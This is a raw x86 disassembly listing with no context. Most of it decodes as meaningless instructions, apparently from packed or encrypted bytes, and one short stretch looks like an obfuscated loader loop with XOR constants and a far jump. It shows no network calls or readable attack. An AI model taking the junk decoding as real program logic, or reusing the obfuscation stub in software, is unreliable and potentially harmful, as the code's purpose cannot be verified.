  40f37b:	test   eax,0x5cf81826
  40f380:	call   DWORD PTR [edi-0x6809ec2e]
  40f386:	iret   
  40f387:	ja     0x40f34b
  40f389:	stos   DWORD PTR es:[edi],eax
  40f38a:	add    al,0x88
  40f38c:	and    al,0xe2
  40f38e:	or     BYTE PTR [edx-0xf],0x28
  40f392:	pop    ss
  40f393:	lea    ecx,[eax]
  40f395:	fnsave [eax-0x1b]
  40f398:	cmp    al,0x39
  40f39a:	jge    0x40f398
  40f39c:	fadd   QWORD PTR [eax+ecx*4]
  40f39f:	cmp    DWORD PTR [eax+0x43ae6adc],edi
  40f3a5:	jmp    0xc3297195
  40f3aa:	and    ebx,DWORD PTR [ecx+0x58]
  40f3ad:	jo     0x40f3ab
  40f3af:	xchg   ecx,eax
  40f3b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3b1:	mov    bl,BYTE PTR [edx-0x1]
  40f3b4:	(bad)  
  40f3b5:	pop    edi
  40f3b6:	test   DWORD PTR [eax+0x76],edi
  40f3b9:	in     al,dx
  40f3ba:	jg     0x40f343
  40f3bc:	and    bh,BYTE PTR ds:0xe46b39bd
  40f3c2:	dec    esi
  40f3c3:	icebp  
  40f3c4:	and    BYTE PTR [edi+0x33],bh
  40f3c7:	inc    eax
  40f3c8:	lds    edi,FWORD PTR [ebx+ecx*2-0x6f]
  40f3cc:	xchg   BYTE PTR [ebp-0x39d42d1],dl
  40f3d2:	push   esp
  40f3d3:	or     BYTE PTR [ecx-0x4b889ce7],dh
  40f3d9:	std    
  40f3da:	push   eax
  40f3db:	and    BYTE PTR [esi+0x187691eb],cl
  40f3e1:	rep lods eax,DWORD PTR ds:[si]
  40f3e4:	xor    DWORD PTR [ebp-0x20],eax
  40f3e7:	sti    
  40f3e8:	mov    ?,WORD PTR [esi-0x77a36464]
  40f3ee:	test   BYTE PTR [edi-0x6d3f0697],ah
  40f3f4:	push   es
  40f3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3f6:	test   DWORD PTR [bx+si+0x56],esp
  40f3fa:	cld    
  40f3fb:	xchg   ecx,eax
  40f3fc:	outs   dx,BYTE PTR ds:[esi]
  40f3fd:	add    BYTE PTR [edx+ecx*8],ah
  40f400:	mov    edi,0x66f9cf0b
  40f405:	adc    DWORD PTR [eax-0x5906aa15],eax
  40f40b:	pop    esi
  40f40c:	mov    eax,ds:0x81ddf800
  40f411:	jns    0x40f454
  40f413:	dec    ebp
  40f414:	es inc edx
  40f416:	mov    ecx,0x9f6584e3
  40f41b:	push   esp
  40f41c:	retf   0x8b8f
  40f41f:	fs push edx
  40f421:	test   al,0xdd
  40f423:	mov    esp,?
  40f425:	mov    cl,0x7c
  40f427:	lahf   
  40f428:	inc    edi
  40f429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f42a:	pop    eax
  40f42b:	fisub  WORD PTR [edx]
  40f42d:	int3   
  40f42e:	cmp    bl,cl
  40f430:	cmp    ch,BYTE PTR [ebp-0x6baeb612]
  40f436:	shl    edx,cl
  40f438:	fnsave [ebp-0x6c]
  40f43b:	push   ebp
  40f43c:	push   edx
  40f43d:	mov    dh,0x5d
  40f43f:	push   esp
  40f440:	imul   ebx,DWORD PTR [eax-0x9af6420],0xe73f42af
  40f44a:	retf   
  40f44b:	lods   al,BYTE PTR ds:[esi]
  40f44c:	out    0x56,eax
  40f44e:	fisub  DWORD PTR [edx]
  40f450:	mov    bl,0xde
  40f452:	or     eax,0x43a3e7e3
  40f457:	(bad)  
  40f458:	dec    edi
  40f459:	test   eax,0xb90e3531
  40f45e:	or     BYTE PTR [ecx-0x15],dh
  40f461:	jmp    0xb48eeaea
  40f466:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40f468:	mov    eax,ds:0x72ba129e
  40f46d:	adc    edi,edi
  40f46f:	jbe    0x40f4e4
  40f471:	je     0x40f4e9
  40f473:	int    0xd9
  40f475:	pop    ds
  40f476:	loope  0x40f439
  40f478:	xchg   ecx,eax
  40f479:	xor    edi,DWORD PTR [ebx-0x2f0470fd]
  40f47f:	mov    eax,0x588ca88a
  40f484:	fs jecxz 0x40f416
  40f487:	sub    dh,cl
  40f489:	pushf  
  40f48a:	test   DWORD PTR [edx-0x79ee7145],esi
  40f490:	jmp    FWORD PTR [esi-0x1d]
  40f493:	pop    es
  40f494:	push   esi
  40f495:	mov    cl,0x68
  40f497:	fldenv [ecx]
  40f499:	scas   eax,DWORD PTR es:[edi]
  40f49a:	mov    al,0x27
  40f49c:	aad    0x41
  40f49e:	outs   dx,DWORD PTR ds:[esi]
  40f49f:	sbb    al,0x54
  40f4a1:	iret   
  40f4a2:	fmul   st,st(6)
  40f4a4:	ror    edx,1
  40f4a6:	mov    esi,0x594463fa
  40f4ab:	stos   BYTE PTR es:[edi],al
  40f4ac:	call   0x70005dbe
  40f4b1:	sub    BYTE PTR [edx+0x18],bl
  40f4b4:	test   DWORD PTR [ecx+edx*1-0x531802b0],esi
  40f4bb:	arpl   di,si
  40f4bd:	fs popa 
  40f4bf:	xchg   edi,eax
  40f4c0:	outs   dx,DWORD PTR ds:[esi]
  40f4c1:	rcr    DWORD PTR [edi+0x6a],0xf8
  40f4c5:	(bad)  
  40f4c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c7:	jb     0x40f545
  40f4c9:	mov    ecx,0x23c7ea04
  40f4ce:	lods   eax,DWORD PTR ds:[esi]
  40f4cf:	imul   ecx,DWORD PTR [esi+0x1f1a5b6f],0xffffffbb
  40f4d6:	outs   dx,BYTE PTR ds:[esi]
  40f4d7:	sahf   
  40f4d8:	rcl    DWORD PTR [edi+ecx*2-0x2793563f],0xb3
  40f4e0:	xchg   BYTE PTR [esi+0x5f90f0fc],al
  40f4e6:	pop    esp
  40f4e7:	inc    ecx
  40f4e8:	xor    ecx,DWORD PTR [ecx+ebx*2]
  40f4eb:	dec    ebx
  40f4ec:	inc    edi
  40f4ed:	sbb    bl,BYTE PTR [eax-0x7e145156]
  40f4f3:	test   BYTE PTR [ecx],bl
  40f4f5:	scas   eax,DWORD PTR es:[edi]
  40f4f6:	rcr    DWORD PTR [edx-0x6c],0x15
  40f4fa:	outs   dx,BYTE PTR ds:[esi]
  40f4fb:	pop    ecx
  40f4fc:	ret    
  40f4fd:	sub    al,0x34
  40f4ff:	(bad)  
  40f500:	sbb    al,bl
  40f502:	adc    BYTE PTR ds:0x2b89c7ff,bh
  40f508:	sti    
  40f509:	frstor [esi+0x2f]
  40f50c:	shl    DWORD PTR [ebx-0x6f],cl
  40f50f:	pop    edx
  40f510:	iret   
  40f511:	cmp    BYTE PTR [ebx+ecx*2],cl
  40f514:	jne    0x40f551
  40f516:	jae    0x40f54d
  40f518:	jmp    0x40f55a
  40f51a:	dec    eax
  40f51b:	mov    edi,0xf1d8d6ff
  40f520:	icebp  
  40f521:	sub    ebx,DWORD PTR ds:0xc986bdb3
  40f527:	shl    DWORD PTR [ecx],0x76
  40f52a:	xlat   BYTE PTR ds:[ebx]
  40f52b:	scas   eax,DWORD PTR es:[edi]
  40f52c:	rol    BYTE PTR [ebx-0x3c],0x3e
  40f530:	ret    
  40f531:	or     DWORD PTR [esi+0x22],edi
  40f534:	aam    0x7f
  40f536:	enter  0xe5c6,0xb6
  40f53a:	fidivr WORD PTR [esi-0x78]
  40f53d:	xor    eax,0xef914d24
  40f542:	sub    eax,0x50fda58f
  40f547:	inc    eax
  40f548:	adc    DWORD PTR [eax+0x2216fcbc],0xffffff87
  40f54f:	and    ebp,DWORD PTR [ecx+0x6b]
  40f552:	mov    ds:0xaa7a7fe4,eax
  40f557:	fucomip st,st(3)
  40f559:	or     ch,ah
  40f55b:	inc    eax
  40f55c:	and    dl,al
  40f55e:	jae    0x40f5df
  40f560:	and    dh,al
  40f562:	pop    ss
  40f563:	sti    
  40f564:	cmp    DWORD PTR [esi-0x7c278e4f],edi
  40f56a:	cmp    al,0xb3
  40f56c:	push   ebp
  40f56d:	xor    ch,BYTE PTR [ebx+0x1eeec0e7]
  40f573:	cmp    BYTE PTR [edx-0x53],0xb5
  40f577:	(bad)  
  40f578:	nop
  40f579:	xchg   edi,eax
  40f57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f57b:	inc    ebp
  40f57c:	mov    ecx,0x4e68f959
  40f581:	push   edi
  40f582:	adc    DWORD PTR [edi+0x29],0xd1f0545b
  40f589:	pop    esi
  40f58a:	sti    
  40f58b:	pop    ebx
  40f58c:	xchg   BYTE PTR [ecx+0x7e],ah
  40f58f:	pop    esp
  40f590:	push   eax
  40f591:	fisttp QWORD PTR [ebx+0xd]
  40f594:	inc    eax
  40f595:	lahf   
  40f596:	hlt    
  40f597:	mov    ds:0x4dfd0758,al
  40f59c:	xchg   DWORD PTR [ebx+ebx*8],ecx
  40f59f:	cmp    al,0xb
  40f5a1:	xchg   ebp,eax
  40f5a2:	gs das 
  40f5a4:	rcr    BYTE PTR [esp+ebx*2-0x62f05f7f],cl
  40f5ab:	call   0x997135e9
  40f5b0:	mov    esp,0x516fe659
  40f5b5:	out    dx,al
  40f5b6:	jmp    0x40f58f
  40f5b8:	mov    ch,0x6b
  40f5ba:	out    0xca,al
  40f5bc:	arpl   WORD PTR [eax-0x33],di
  40f5bf:	xchg   esp,eax
  40f5c0:	cwde   
  40f5c1:	adc    DWORD PTR [edi],edx
  40f5c3:	shr    BYTE PTR [ebp+0x15ec8226],cl
  40f5c9:	push   cs
  40f5ca:	into   
  40f5cb:	mov    al,ds:0x31705ab1
  40f5d0:	cdq    
  40f5d1:	repz cmp ch,BYTE PTR [eax]
  40f5d4:	ja     0x40f64d
  40f5d6:	add    edx,DWORD PTR [edi+edx*1+0xce244f4]
  40f5dd:	pop    esi
  40f5de:	imul   ebx,DWORD PTR [eax],0xffffff98
  40f5e1:	jg     0x40f64e
  40f5e3:	dec    edx
  40f5e4:	xchg   esp,eax
  40f5e5:	or     esp,esi
  40f5e7:	jae    0x40f5ff
  40f5e9:	retf   
  40f5ea:	icebp  
  40f5eb:	dec    esp
  40f5ec:	xchg   DWORD PTR [esi],eax
  40f5ee:	fst    QWORD PTR [eax]
  40f5f0:	push   es
  40f5f1:	stos   BYTE PTR es:[edi],al
  40f5f2:	dec    ecx
  40f5f3:	sub    BYTE PTR [ebx],bh
  40f5f5:	(bad)  
  40f5f6:	in     al,0x3
  40f5f8:	mov    BYTE PTR [edx+0x3302ac41],bl
  40f5fe:	lods   eax,DWORD PTR ds:[esi]
  40f5ff:	imul   ebx,DWORD PTR [edx],0xffffffaf
  40f602:	or     ecx,DWORD PTR ds:0x904cf895
  40f608:	(bad)  
  40f609:	loopne 0x40f687
  40f60b:	xchg   edx,eax
  40f60c:	lods   eax,DWORD PTR ds:[esi]
  40f60d:	lea    eax,[ecx]
  40f60f:	cmp    eax,0xcb927766
  40f614:	ja     0x40f66e
  40f616:	inc    ebp
  40f617:	pop    ds
  40f618:	inc    edx
  40f619:	push   ecx
  40f61a:	ss push ss
  40f61c:	fdivp  st(0),st
  40f61e:	or     DWORD PTR [edi+0x1f],edi
  40f621:	xor    DWORD PTR ds:0x4e831f4a,ebx
  40f627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f628:	mov    ebp,0xe5329bd3
  40f62d:	or     ebx,ebx
  40f62f:	inc    ebx
  40f630:	lock daa 
  40f632:	rol    BYTE PTR [eax-0x6b],cl
  40f635:	or     bl,BYTE PTR [edx-0x80]
  40f638:	cmp    esp,DWORD PTR [eax+0x4f]
  40f63b:	in     al,0x2d
  40f63d:	push   ss
  40f63e:	loopne 0x40f5ff
  40f640:	dec    esi
  40f641:	mov    bh,0xdd
  40f643:	imul   eax,DWORD PTR [ecx+edx*2],0xffffffa0
  40f647:	jnp    0x40f681
  40f649:	pop    esp
  40f64a:	lods   al,BYTE PTR ds:[esi]
  40f64b:	mov    bh,0x5c
  40f64d:	dec    ebp
  40f64e:	cwde   
  40f64f:	test   dh,cl
  40f651:	mul    ecx
  40f653:	js     0x40f6b4
  40f655:	adc    BYTE PTR [eax+0x498c8874],0x39
  40f65c:	clc    
  40f65d:	daa    
  40f65e:	dec    eax
  40f65f:	in     eax,dx
  40f660:	arpl   si,ax
  40f662:	aad    0x77
  40f664:	iret   
  40f665:	mov    dh,0x61
  40f667:	push   ds
  40f668:	adc    DWORD PTR [ecx],ebp
  40f66a:	cwde   
  40f66b:	mov    eax,ds:0xb01b532c
  40f670:	xchg   esp,eax
  40f671:	(bad)  
  40f672:	or     esp,DWORD PTR [ebp+0x4a0c6e98]
  40f678:	push   esp
  40f679:	jb     0x40f689
  40f67b:	inc    esi
  40f67c:	ss and al,0xdf
  40f67f:	push   esp
  40f680:	pop    ebx
  40f681:	xor    al,0x5a
  40f683:	sbb    al,0x7c
  40f685:	push   esi
  40f686:	ret    
  40f687:	ins    BYTE PTR es:[edi],dx
  40f688:	mov    ch,0x65
  40f68a:	xchg   BYTE PTR [ebx+0x44],ah
  40f68d:	xor    ah,BYTE PTR [ecx-0x19]
  40f690:	daa    
  40f691:	mov    ?,WORD PTR [edx+0x58e45fcd]
  40f697:	(bad)  
  40f698:	mov    ebx,0x904ca3c7
  40f69d:	jae    0x40f6f4
  40f69f:	inc    edx
  40f6a0:	cld    
  40f6a1:	aam    0x96
  40f6a3:	cmp    BYTE PTR [ebp-0x12],bh
  40f6a6:	mov    bh,0x68
  40f6a8:	jmp    0x589c:0x3a9a45b6
  40f6af:	fdivr  QWORD PTR [eax+0x63]
  40f6b2:	pop    es
  40f6b3:	(bad)  
  40f6b4:	xchg   edx,eax
  40f6b5:	test   al,0x8b
  40f6b7:	push   esp
  40f6b8:	cmp    DWORD PTR [edi-0x27f0fd36],ebx
  40f6be:	fcomp  DWORD PTR [edx+0x3df314a5]
  40f6c4:	cmp    eax,DWORD PTR [edx]
  40f6c6:	gs sub eax,0x589bb1b5
  40f6cc:	sbb    dl,bl
  40f6ce:	mov    al,ds:0x88f609e5
  40f6d3:	mov    ch,0xb0
  40f6d5:	addr16 adc eax,0xee39d72a
  40f6db:	into   
  40f6dc:	jae    0x40f717
  40f6de:	aad    0x60
  40f6e0:	inc    ecx
  40f6e1:	fstp   DWORD PTR ds:0xdf881fab
  40f6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e8:	xchg   BYTE PTR [esi+0x47],al
  40f6eb:	fwait
  40f6ec:	lods   al,BYTE PTR ds:[esi]
  40f6ed:	jge    0x40f6f3
  40f6ef:	pushf  
  40f6f0:	dec    ebx
  40f6f1:	dec    ebp
  40f6f2:	in     al,0x2e
  40f6f4:	sbb    ebp,DWORD PTR cs:[ebx-0x17bb42f1]
  40f6fb:	sbb    ah,ah
  40f6fd:	mov    edx,0x32584e05
  40f702:	out    dx,al
  40f703:	cmc    
  40f704:	xor    eax,0x80c2b8fe
  40f709:	shl    BYTE PTR [edx+0x38ac063f],cl
  40f70f:	ins    BYTE PTR es:[edi],dx
  40f710:	jmp    0xd930:0xbd566ee2
  40f717:	or     eax,0xe38cee6e
  40f71c:	xor    al,0x16
  40f71e:	icebp  
  40f71f:	test   al,0x92
  40f721:	test   al,0xfb
  40f723:	dec    ecx
  40f724:	std    
  40f725:	sbb    eax,0x13495938
  40f72a:	sbb    esi,DWORD PTR [eax]
  40f72c:	dec    ebp
  40f72d:	imul   edx,DWORD PTR [eax+eax*8+0xc],0xffffffbc
  40f732:	std    
  40f733:	popa   
  40f734:	lods   al,BYTE PTR ds:[esi]
  40f735:	mov    ecx,?
  40f737:	fmul   st(1),st
  40f739:	mov    ecx,0x8a020f38
  40f73e:	mov    fs,esi
  40f740:	daa    
  40f741:	xchg   ecx,eax
  40f742:	scas   al,BYTE PTR es:[edi]
  40f743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f744:	fstp   TBYTE PTR [ebp+0x4ac70b8a]
  40f74a:	cli    
  40f74b:	mov    eax,0x38e60bee
  40f750:	mov    eax,0x52b67915
  40f755:	les    ebx,FWORD PTR [esi+ecx*4-0x4179ef6d]
  40f75c:	mov    ds:0x4df81622,eax
  40f761:	test   al,0x99
  40f763:	cmp    cl,BYTE PTR [edi+0xcc98769]
  40f769:	daa    
  40f76a:	inc    ax
  40f76c:	inc    esp
  40f76d:	sub    BYTE PTR [eax-0x76],ah
  40f770:	loopne 0x40f769
  40f772:	pop    es
  40f773:	mov    cs,WORD PTR [ecx+0x45f43d66]
  40f779:	into   
  40f77a:	push   esi
  40f77b:	mov    ah,0x9b
  40f77d:	push   ss
  40f77e:	or     al,0xe1
  40f780:	xor    ebx,DWORD PTR [esi]
  40f782:	pop    esp
  40f783:	rol    DWORD PTR [ecx-0x35c14334],1
  40f789:	cld    
  40f78a:	xor    bh,BYTE PTR [ecx-0x4057dacd]
  40f790:	mov    fs,WORD PTR [esi]
  40f792:	dec    ebx
  40f793:	cwde   
  40f794:	push   0xffffffed
  40f796:	scas   eax,DWORD PTR es:[edi]
  40f797:	loop   0x40f7f1
  40f799:	inc    ecx
  40f79a:	sub    BYTE PTR [eax+0x48],bl
  40f79d:	dec    edi
  40f79e:	rcl    DWORD PTR [edx+0x13],cl
  40f7a1:	or     eax,0xd2a54a92
  40f7a6:	and    DWORD PTR [esi],esp
  40f7a8:	inc    ecx
  40f7a9:	inc    ebx
  40f7aa:	imul   esp,DWORD PTR [ebp-0x77],0xffffffd4
  40f7ae:	mov    edx,0x1d952fe0
  40f7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b4:	(bad)  
  40f7b7:	iret   
  40f7b8:	stos   BYTE PTR es:[edi],al
  40f7b9:	sub    al,BYTE PTR [ecx+0x5f9c75b0]
  40f7bf:	je     0x40f771
  40f7c1:	adc    ah,bl
  40f7c3:	std    
  40f7c4:	jmp    0x751:0x8b3b947
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xebd5bda
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	push   ds
  40f871:	pop    edx
  40f872:	out    dx,eax
  40f873:	xor    DWORD PTR [eax+esi*4+0x4e],edi
  40f877:	pop    esp
  40f878:	out    dx,eax
  40f879:	idiv   eax
  40f87b:	ins    DWORD PTR es:[edi],dx
  40f87c:	outs   dx,BYTE PTR ds:[esi]
  40f87d:	ss push es
  40f87f:	mov    ah,0x76
  40f881:	pop    esp
  40f882:	icebp  
  40f883:	mov    bh,BYTE PTR [edi-0x13]
  40f886:	mov    dl,0xa5
  40f888:	mov    al,ds:0xd25862fe
  40f88d:	dec    ebx
  40f88e:	adc    DWORD PTR [edi+0x6ebcb3a5],esp
  40f894:	adc    ebp,ebx
  40f896:	add    DWORD PTR ss:[esi+0x2d],ebx
  40f89a:	pusha  
  40f89b:	outs   dx,BYTE PTR ds:[esi]
  40f89c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f89d:	and    al,0x71
  40f89f:	in     eax,dx
  40f8a0:	pop    ds
  40f8a1:	in     eax,0x5b
  40f8a3:	dec    ebp
  40f8a4:	ins    BYTE PTR es:[edi],dx
  40f8a5:	ja     0x40f84f
  40f8a7:	daa    
  40f8a8:	push   0xffffffe4
  40f8aa:	or     eax,0x6e4a1103
  40f8af:	stos   DWORD PTR es:[edi],eax
  40f8b0:	mov    esp,0x43d34aef
  40f8b5:	mov    al,ds:0x3ac751b2
  40f8ba:	dec    ebp
  40f8bb:	jmp    0x40f85b
  40f8bd:	scas   eax,DWORD PTR es:[edi]
  40f8be:	les    esp,FWORD PTR [edx+0x1f9a3851]
  40f8c4:	loop   0x40f89b
  40f8c6:	cld    
  40f8c7:	retf   
  40f8c8:	pop    esp
  40f8c9:	pusha  
  40f8ca:	jno    0x40f865
  40f8cc:	dec    edi
  40f8cd:	arpl   sp,dx
  40f8cf:	jne    0x40f8f3
  40f8d1:	(bad)  
  40f8d3:	mov    dl,0x62
  40f8d5:	es das 
  40f8d7:	and    al,0x29
  40f8d9:	xor    eax,0x30cfc945
  40f8de:	sbb    esi,ecx
  40f8e0:	cwde   
  40f8e1:	mov    dh,0xb0
  40f8e3:	out    dx,al
  40f8e4:	outs   dx,DWORD PTR ds:[esi]
  40f8e5:	pop    ecx
  40f8e6:	xchg   ebx,eax
  40f8e7:	adc    ecx,DWORD PTR ds:0xa2adf1c8
  40f8ed:	not    cl
  40f8ef:	jbe    0x40f96e
  40f8f1:	inc    edx
  40f8f2:	cdq    
  40f8f3:	adc    DWORD PTR [edx+0x21133627],eax
  40f8f9:	mov    ds:0xee1bbe78,al
  40f8fe:	test   DWORD PTR [ebp+0x4e],0xaa1ada52
  40f905:	pushf  
  40f906:	and    ah,BYTE PTR [edx+eiz*1]
  40f909:	ficom  DWORD PTR [ebx+0x15]
  40f90c:	inc    ebp
  40f90d:	setne  BYTE PTR [esi+0x1dad95cb]
  40f914:	mov    ch,0xeb
  40f916:	cmp    BYTE PTR [esi+0x7f66fb9c],ah
  40f91c:	pusha  
  40f91d:	add    eax,0x30a743b3
  40f922:	ja     0x40f984
  40f924:	test   al,0x5a
  40f926:	mov    ebx,0xe68c8b1d
  40f92b:	or     al,0x3b
  40f92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f92e:	xchg   edx,eax
  40f92f:	dec    esp
  40f930:	ja     0x40f99b
  40f932:	out    dx,al
  40f933:	xchg   esi,eax
  40f934:	or     al,0x54
  40f936:	ss icebp 
  40f938:	pop    edi
  40f939:	and    eax,0x3153b6e3
  40f93e:	clc    
  40f93f:	mov    gs,WORD PTR [esi-0x7d]
  40f942:	push   ss
  40f943:	sbb    al,0x65
  40f945:	sub    al,0xbe
  40f947:	lods   eax,DWORD PTR ds:[esi]
  40f948:	and    al,0x1f
  40f94a:	int    0x85
  40f94c:	sbb    al,0x9b
  40f94e:	mov    esp,0x76a40f44
  40f953:	loop   0x40f940
  40f955:	jne    0x40f988
  40f957:	das    
  40f958:	dec    eax
  40f959:	pop    eax
  40f95a:	mov    ds:0x9ba604fa,al
  40f95f:	xchg   ebx,eax
  40f960:	push   ecx
  40f961:	loop   0x40f8ef
  40f963:	pop    ds
  40f964:	or     ah,ah
  40f966:	shl    BYTE PTR [ebp+0x2627a2dd],0xab
  40f96d:	cmp    BYTE PTR [ebp+0x68636043],dh
  40f973:	inc    eax
  40f974:	add    eax,DWORD PTR [ecx+eax*2-0x5b498575]
  40f97b:	sub    cl,BYTE PTR [esi+ebx*2]
  40f97e:	icebp  
  40f97f:	mov    ah,0x12
  40f981:	mov    dl,0xe1
  40f983:	leave  
  40f984:	pop    esp
  40f985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f986:	adc    eax,0xe098ec39
  40f98b:	push   ebp
  40f98c:	xchg   BYTE PTR [esp+edx*1+0x1a],cl
  40f990:	call   0x6f7698a
  40f995:	mov    edx,gs
  40f997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f998:	xor    ah,BYTE PTR [edx]
  40f99a:	stc    
  40f99b:	cmp    DWORD PTR [ebx+0x402decb1],edi
  40f9a1:	add    dh,BYTE PTR [ebx+edi*1]
  40f9a4:	xor    al,bl
  40f9a6:	aas    
  40f9a7:	pop    DWORD PTR [ebx+ecx*8-0x38]
  40f9ab:	ins    DWORD PTR es:[edi],dx
  40f9ac:	ja     0x40f9ef
  40f9ae:	mov    ch,0x70
  40f9b0:	xchg   esp,eax
  40f9b1:	mov    esp,DWORD PTR [edx+0x65]
  40f9b4:	dec    ebp
  40f9b5:	add    esi,DWORD PTR [ebp+0x8c24e80]
  40f9bb:	psubusb mm3,QWORD PTR [esi-0x5b594fee]
  40f9c2:	cmc    
  40f9c3:	imul   esi,DWORD PTR [ecx+0x5],0x851273fe
  40f9ca:	scas   eax,DWORD PTR es:[edi]
  40f9cb:	into   
  40f9cc:	or     al,0xb8
  40f9ce:	in     al,dx
  40f9cf:	and    ecx,DWORD PTR [eax]
  40f9d1:	xor    bh,BYTE PTR [esi+0xad9d040]
  40f9d7:	loop   0x40f9fd
  40f9d9:	lea    edi,[ecx]
  40f9db:	les    edx,FWORD PTR [esi-0x28]
  40f9de:	pop    eax
  40f9df:	adc    ecx,ecx
  40f9e1:	mov    bl,0xcb
  40f9e3:	loop   0x40fa1f
  40f9e5:	popf   
  40f9e6:	xchg   ebp,eax
  40f9e7:	ins    BYTE PTR es:[edi],dx
  40f9e8:	sbb    dl,BYTE PTR [edi-0x6c7f0877]
  40f9ee:	push   0x94177939
  40f9f3:	out    dx,eax
  40f9f4:	les    esi,FWORD PTR [edx+0x6b5d7849]
  40f9fa:	inc    edi
  40f9fb:	and    eax,0x85bc6506
  40fa00:	mov    dh,0xaf
  40fa02:	pop    ecx
  40fa03:	in     eax,0x9c
  40fa05:	xor    bl,bh
  40fa07:	sahf   
  40fa08:	clc    
  40fa09:	repnz xchg edi,eax
  40fa0b:	push   eax
  40fa0c:	stos   BYTE PTR es:[edi],al
  40fa0d:	push   cs
  40fa0e:	loope  0x40fa4b
  40fa10:	add    BYTE PTR [edx+ebx*2],0x19
  40fa14:	and    bh,BYTE PTR [edx]
  40fa16:	or     al,0xf4
  40fa18:	mov    edi,0x25c754aa
  40fa1d:	xor    BYTE PTR [esi],dh
  40fa1f:	retf   0x42c8
  40fa22:	jmp    0x10966f90
  40fa27:	aad    0x6f
  40fa29:	add    ch,BYTE PTR [edx-0x76]
  40fa2c:	jge    0x40fa33
  40fa2e:	dec    eax
  40fa2f:	add    ebx,edi
  40fa31:	leave  
  40fa32:	inc    eax
  40fa33:	push   es
  40fa34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa35:	call   0x49fa:0xae1d8759
  40fa3c:	retf   
  40fa3d:	mov    ds:0xe29348a6,al
  40fa42:	cmp    BYTE PTR [esi-0x57be79cf],dh
  40fa48:	cmp    eax,0xfa45cdfc
  40fa4d:	fs mov esp,0x8ecdc0b9
  40fa53:	outs   dx,DWORD PTR ds:[esi]
  40fa54:	jp     0x40f9ea
  40fa56:	cmp    BYTE PTR [si+0x453f],al
  40fa5b:	call   0x6e00cbbd
  40fa60:	mov    ecx,0x69c4556a
  40fa65:	xchg   esp,eax
  40fa66:	xchg   DWORD PTR [edi+0x6c176b5e],eax
  40fa6c:	mov    al,ds:0xefb6746e
  40fa71:	ss dec edi
  40fa73:	mov    esp,0x44f00a7f
  40fa78:	push   ecx
  40fa79:	mov    cl,0xc5
  40fa7b:	das    
  40fa7c:	outs   dx,DWORD PTR ds:[esi]
  40fa7d:	std    
  40fa7e:	jo     0x40fa6b
  40fa80:	or     BYTE PTR ds:0x749176e6,dl
  40fa86:	push   edx
  40fa87:	aaa    
  40fa88:	mov    ebp,fs
  40fa8a:	add    BYTE PTR [ecx-0x1a62b3f3],0x3d
  40fa91:	or     esi,DWORD PTR [eax+eiz*2]
  40fa94:	or     esp,eax
  40fa96:	jo     0x40fabd
  40fa98:	lods   al,BYTE PTR ds:[esi]
  40fa99:	mov    esp,0xdbc60e0a
  40fa9e:	inc    DWORD PTR [eax+0x5b3e8112]
  40faa4:	inc    ebp
  40faa5:	out    0xa5,al
  40faa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faa9:	or     BYTE PTR gs:[esi+0x32c18a44],0x18
  40fab1:	mov    ecx,0x5be63a63
  40fab6:	aad    0x93
  40fab8:	jge    0x40facd
  40faba:	mov    bh,0x66
  40fabc:	push   esp
  40fabd:	idiv   esi
  40fabf:	mov    ebx,0xa195ee5b
  40fac4:	fucomip st,st(0)
  40fac6:	popa   
  40fac7:	pop    ebx
  40fac8:	jecxz  0x40fb0d
  40faca:	daa    
  40facb:	fdivr  QWORD PTR [esi-0x65]
  40face:	pop    edi
  40facf:	icebp  
  40fad0:	test   edx,ebp
  40fad2:	in     eax,dx
  40fad3:	push   ebx
  40fad4:	cmc    
  40fad5:	fild   WORD PTR [eax]
  40fad7:	fwait
  40fad8:	xchg   BYTE PTR [ebx-0x3d],bh
  40fadb:	add    BYTE PTR ds:0x2801dc10,cl
  40fae1:	test   DWORD PTR [ecx],edx
  40fae3:	ss stc 
  40fae5:	and    BYTE PTR [edx],bl
